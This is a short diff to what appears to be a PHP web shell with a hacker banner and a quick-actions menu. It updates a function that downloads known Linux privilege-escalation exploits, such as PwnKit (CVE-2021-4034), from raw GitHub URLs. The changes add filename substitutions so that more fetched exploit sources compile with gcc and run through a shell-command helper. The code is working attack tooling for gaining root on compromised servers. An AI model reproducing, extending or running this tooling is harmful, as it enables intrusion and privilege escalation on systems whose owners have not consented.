@@ -2202,7 +2202,7 @@ function auto_compile_kernel_exploit($cve, $kernel_version) {
         ],
         'CVE-2021-4034' => [
             'name' => 'PwnKit',
-            'source' => 'https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034.c',
+            'source' => 'https://raw.githubusercontent.com/berdav/CVE-2021-4034/refs/heads/main/cve-2021-4034.c',
             'compile_cmd' => 'gcc -o /tmp/pwnkit cve-2021-4034.c -Wall'
         ],
         'CVE-2021-3156' => [
@@ -2352,10 +2352,16 @@ function auto_compile_kernel_exploit($cve, $kernel_version) {
     
     @file_put_contents($source_file, $source_content);
     
-    // Compile
+    // Compile - adjust filename references in compile command
     $compile_cmd = str_replace('dirtyc0w.c', $source_file, $exploit['compile_cmd']);
     $compile_cmd = str_replace('exploit.c', $source_file, $compile_cmd);
+    $compile_cmd = str_replace('poc.c', $source_file, $compile_cmd);
+    $compile_cmd = str_replace('pwn.c', $source_file, $compile_cmd);
+    $compile_cmd = str_replace('ptmx.c', $source_file, $compile_cmd);
     $compile_cmd = str_replace('cve-2021-4034.c', $source_file, $compile_cmd);
+    $compile_cmd = str_replace('cve-2020-8835.c', $source_file, $compile_cmd);
+    $compile_cmd = str_replace('cve-2017-16995.c', $source_file, $compile_cmd);
+    $compile_cmd = str_replace('CVE-2022-0995.c', $source_file, $compile_cmd);
     $compile_cmd = str_replace('/tmp/', $tmp_dir . '/', $compile_cmd);
     
     $compile_output = execute_shell_command("cd $tmp_dir && $compile_cmd 2>&1");
@@ -3280,7 +3286,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::S Y A L O M:: ~ 280326 2058</h1>
+        <h1>::S Y A L O M:: ~ 280326 2108</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
